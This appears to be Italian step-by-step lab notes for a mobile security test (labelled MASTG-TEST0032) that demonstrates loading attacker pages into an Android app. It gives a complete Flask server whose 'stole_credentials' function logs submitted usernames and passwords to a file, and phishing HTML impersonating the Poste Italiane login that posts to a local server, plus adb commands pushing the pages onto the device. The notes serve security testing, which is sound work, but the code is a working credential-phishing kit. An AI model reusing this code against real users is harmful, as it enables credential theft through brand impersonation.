MASTG-TEST0032 ATTACK
- creare file app.py:
    from flask import Flask,request,render_template
    app = Flask(__name__)
    @app.route('/')
    def home():
        return render_template("home.html")
    @app.route('/login', methods=['GET','POST'])
    def attack():
        error = None
        if request.method == 'POST':
            name=request.form['username']
            pwd=request.form['pwd']
            if name!= "" or pwd!="":
                stole_credentials(name,pwd)
            else:
                error = 'Invalid username/password'
        else:
            return render_template("login.html")
        # the code below is executed if the request method
        # was GET or the credentials were invalid
        return render_template('login.html', error=error)
    def stole_credentials(user,pwd):
        file_path = 'example.txt'
        # Open the file in 'write' mode ('a')
        # This will create a new file if it doesn't exist or truncate the file if it exists
        with open(file_path, 'a+') as file:
            # Write content to the file
            file.write("Username:"+user+" Pwd: "+pwd+"\n")
        return render_template("home.html",name=user)
- creare cartella templates ed inserire i seguenti file.
- creare file home.html:
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>EXPLOIT</title>

    </head>
    <body>
        <p>For the login on Poste follow this <a href="login.html">link</a></p>
            
    </body>
    </html>
- creare file login.html:
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>EXPLOIT</title>

    </head>
    <body>

        <h1>Poste Italiane</h1>
        <h2>Accedi o Registrati</h2>
        <form action="http://10.0.2.2:5000/login" method="POST">
            <input type="text" name="username" id="username" placeholder="Username o Email"><br>
            <input type="text" name="pwd" id="password" placeholder="Password"><br>
            <input type="submit" value="login" >
        </form>
            
    </body>
    </html>

- pushare nel dispositivo mobile in /sdcard/Android/data i file home.html e login.html:
    adb push home.html /sdcard/Android/data
    adb push login.html /sdcard/Android/data
- runnare server : flask --app app run
- lanciare applicazione.
